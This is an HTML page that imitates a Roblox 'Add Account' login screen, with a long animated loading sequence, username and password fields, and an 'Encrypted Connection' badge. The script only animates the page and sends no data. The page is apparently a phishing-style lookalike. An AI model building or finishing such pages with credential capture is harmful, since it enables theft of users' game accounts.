<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox | Add Account</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            color: #ffffff;
        }

        /* Premium Bubble Background */
        .bubbles-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }

        .bubble {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.03);
            box-shadow: 
                0 0 20px rgba(255, 255, 255, 0.05),
                inset 0 0 20px rgba(255, 255, 255, 0.03);
            animation: floatUp 15s infinite linear;
            opacity: 0;
        }

        .bubble:nth-child(1) {
            width: 120px;
            height: 120px;
            left: 10%;
            animation-delay: 0s;
            animation-duration: 25s;
        }

        .bubble:nth-child(2) {
            width: 80px;
            height: 80px;
            left: 25%;
            animation-delay: 2s;
            animation-duration: 20s;
        }

        .bubble:nth-child(3) {
            width: 150px;
            height: 150px;
            left: 45%;
            animation-delay: 4s;
            animation-duration: 30s;
        }

        .bubble:nth-child(4) {
            width: 60px;
            height: 60px;
            left: 65%;
            animation-delay: 1s;
            animation-duration: 18s;
        }

        .bubble:nth-child(5) {
            width: 100px;
            height: 100px;
            left: 80%;
            animation-delay: 3s;
            animation-duration: 22s;
        }

        .bubble:nth-child(6) {
            width: 70px;
            height: 70px;
            left: 35%;
            animation-delay: 5s;
            animation-duration: 26s;
        }

        @keyframes floatUp {
            0% {
                transform: translateY(100vh) scale(0.5);
                opacity: 0;
            }
            10% {
                opacity: 0.1;
            }
            50% {
                opacity: 0.15;
            }
            90% {
                opacity: 0.1;
            }
            100% {
                transform: translateY(-100px) scale(1);
                opacity: 0;
            }
        }

        /* Loading Screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #0a0a0a;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            transition: opacity 3s ease;
        }

        .loading-text {
            color: #ffffff;
            font-size: 36px;
            font-weight: 300;
            margin-bottom: 30px;
            text-align: center;
            letter-spacing: 1px;
            opacity: 0;
            transition: opacity 3s ease;
        }

        .loading-bar {
            width: 300px;
            height: 2px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 1px;
            overflow: hidden;
        }

        .loading-progress {
            height: 100%;
            width: 0%;
            background: #ffffff;
            border-radius: 1px;
            transition: width 0.3s ease;
        }

        .get-started-text {
            color: #ffffff;
            font-size: 28px;
            font-weight: 300;
            text-align: center;
            letter-spacing: 1px;
            opacity: 0;
            position: absolute;
            transition: opacity 3s ease;
        }

        /* Login Container */
        .login-container {
            background: rgba(30, 30, 30, 0.85);
            border-radius: 20px;
            width: 440px;
            box-shadow: 
                0 10px 40px rgba(0, 0, 0, 0.5),
                0 0 0 1px rgba(255, 255, 255, 0.05),
                inset 0 0 0 1px rgba(255, 255, 255, 0.03);
            overflow: hidden;
            display: flex;
            flex-direction: column;
            backdrop-filter: blur(10px);
            transform: scale(0.95);
            opacity: 0;
            transition: all 1.2s cubic-bezier(0.19, 1, 0.22, 1);
            filter: grayscale(1);
        }

        .login-container.active {
            transform: scale(1);
            opacity: 1;
        }

        .header {
            padding: 50px 50px 30px;
            text-align: center;
            position: relative;
        }

        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 2px;
            background: rgba(255, 255, 255, 0.1);
        }

        .title {
            font-size: 32px;
            font-weight: 400;
            color: #ffffff;
            margin-bottom: 8px;
            letter-spacing: 1.5px;
        }

        .subtitle {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.5);
            font-weight: 300;
            letter-spacing: 0.5px;
        }

        .login-form {
            padding: 40px 50px;
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .input-group {
            margin-bottom: 30px;
            position: relative;
        }

        .input-field {
            width: 100%;
            padding: 18px 20px;
            background: rgba(40, 40, 40, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            font-size: 16px;
            color: #ffffff;
            transition: all 0.4s ease;
            font-weight: 300;
            letter-spacing: 0.5px;
        }

        .input-field:focus {
            outline: none;
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(45, 45, 45, 0.8);
            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.05);
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.3);
            font-weight: 300;
        }

        .login-button {
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: none;
            padding: 18px 20px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 400;
            cursor: pointer;
            transition: all 0.4s ease;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
            letter-spacing: 1px;
            backdrop-filter: blur(5px);
        }

        .login-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: 0.6s;
        }

        .login-button:hover::before {
            left: 100%;
        }

        .login-button:hover {
            background: rgba(255, 255, 255, 0.15);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .forgot-link {
            color: rgba(255, 255, 255, 0.5);
            text-decoration: none;
            font-size: 14px;
            text-align: center;
            display: block;
            margin-bottom: 35px;
            transition: color 0.3s ease;
            font-weight: 300;
            letter-spacing: 0.5px;
        }

        .forgot-link:hover {
            color: rgba(255, 255, 255, 0.8);
        }

        .divider {
            height: 1px;
            background: rgba(255, 255, 255, 0.1);
            margin: 25px 0;
            position: relative;
        }

        .divider::before {
            content: 'or';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(30, 30, 30, 0.85);
            padding: 0 15px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 14px;
            font-weight: 300;
        }

        .option-button {
            width: 100%;
            background: rgba(40, 40, 40, 0.7);
            color: rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 16px 20px;
            border-radius: 10px;
            font-size: 15px;
            margin-bottom: 15px;
            cursor: pointer;
            transition: all 0.4s ease;
            text-align: center;
            position: relative;
            overflow: hidden;
            font-weight: 300;
            letter-spacing: 0.5px;
        }

        .option-button:hover {
            background: rgba(45, 45, 45, 0.8);
            border-color: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        .signup-section {
            text-align: center;
            margin-top: 30px;
            padding-top: 25px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }

        .signup-text {
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            margin-bottom: 12px;
            font-weight: 300;
            letter-spacing: 0.5px;
        }

        .signup-link {
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            font-size: 15px;
            font-weight: 400;
            transition: all 0.3s ease;
            position: relative;
            letter-spacing: 0.5px;
            padding-bottom: 2px;
        }

        .signup-link::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 1px;
            bottom: 0;
            left: 0;
            background: rgba(255, 255, 255, 0.5);
            transform: scaleX(0);
            transform-origin: bottom right;
            transition: transform 0.4s ease;
        }

        .signup-link:hover::after {
            transform: scaleX(1);
            transform-origin: bottom left;
        }

        .signup-link:hover {
            color: rgba(255, 255, 255, 0.9);
        }

        .security-notice {
            color: rgba(255, 255, 255, 0.4);
            font-size: 11px;
            text-align: center;
            margin-top: 20px;
            font-weight: 300;
            letter-spacing: 0.5px;
        }

        .brand-logo {
            position: fixed;
            bottom: 30px;
            right: 30px;
            color: rgba(255, 255, 255, 0.2);
            font-size: 14px;
            font-weight: 300;
            letter-spacing: 1px;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .login-container {
                width: 90%;
                min-width: unset;
            }
            
            .login-form {
                padding: 30px;
            }
            
            .header {
                padding: 40px 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="bubbles-container">
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
    </div>

    <div class="loading-screen" id="loadingScreen">
        <div class="loading-text" id="loadingText">Loading Roblox..</div>
        <div class="loading-bar">
            <div class="loading-progress" id="loadingProgress"></div>
        </div>
        <div class="get-started-text" id="getStartedText">Before you get started..</div>
    </div>

    <div class="login-container" id="loginContainer">
        <div class="header">
            <div class="title">Add Account</div>
            <div class="subtitle">Securely access your experience</div>
        </div>
        
        <div class="login-form">
            <div class="input-group">
                <input type="text" class="input-field" placeholder="Username">
            </div>
            
            <div class="input-group">
                <input type="password" class="input-field" placeholder="Password">
            </div>
            
            <button class="login-button">Log In</button>
            
            <a href="#" class="forgot-link">Forgot Password or Username?</a>
            
            <div class="divider"></div>
            
            <button class="option-button">Email Me a One-Time Code</button>
            
            <div class="signup-section">
                <div class="signup-text">Don't have an account?</div>
                <a href="#" class="signup-link">Sign Up</a>
                <div class="security-notice">ðŸ”’ Secure Authentication | Encrypted Connection</div>
            </div>
        </div>
    </div>

    <div class="brand-logo">ROBLOX</div>

    <script>
        // Loading sequence
        document.addEventListener('DOMContentLoaded', function() {
            const loadingScreen = document.getElementById('loadingScreen');
            const loadingText = document.getElementById('loadingText');
            const getStartedText = document.getElementById('getStartedText');
            const loginContainer = document.getElementById('loginContainer');
            const loadingProgress = document.getElementById('loadingProgress');
            
            // Start progress bar animation
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 1;
                loadingProgress.style.width = `${progress}%`;
                
                if (progress >= 100) {
                    clearInterval(progressInterval);
                }
            }, 80);
            
            // Sequence of loading animations
            setTimeout(() => {
                // Fade in "Loading Roblox.." after 4s
                loadingText.style.opacity = '1';
                
                // After 5s, fade out "Loading Roblox.." over 3s
                setTimeout(() => {
                    loadingText.style.opacity = '0';
                    
                    // Fade in "Before you get started.." after fade out completes
                    setTimeout(() => {
                        getStartedText.style.opacity = '1';
                        
                        // After 5s, fade out "Before you get started.." over 3s
                        setTimeout(() => {
                            getStartedText.style.opacity = '0';
                            
                            // Wait 4s after second text disappears, then fade in login
                            setTimeout(() => {
                                loadingScreen.style.opacity = '0';
                                
                                setTimeout(() => {
                                    loadingScreen.style.display = 'none';
                                    loginContainer.classList.add('active');
                                }, 3000);
                            }, 4000);
                        }, 5000);
                    }, 3000);
                }, 5000);
            }, 4000);
            
            // Add interactive effects to input fields
            document.querySelectorAll('.input-field').forEach(field => {
                field.addEventListener('focus', function() {
                    this.style.background = 'rgba(50, 50, 50, 0.8)';
                });
                
                field.addEventListener('blur', function() {
                    this.style.background = 'rgba(40, 40, 40, 0.7)';
                });
            });
            
            // Add click effects to buttons
            document.querySelectorAll('button').forEach(button => {
                button.addEventListener('mousedown', function() {
                    this.style.transform = 'translateY(0)';
                });
                
                button.addEventListener('mouseup', function() {
                    if (this.classList.contains('login-button') || this.classList.contains('option-button')) {
                        this.style.transform = 'translateY(-2px)';
                    }
                });
            });
        });
    </script>
</body>
</html>
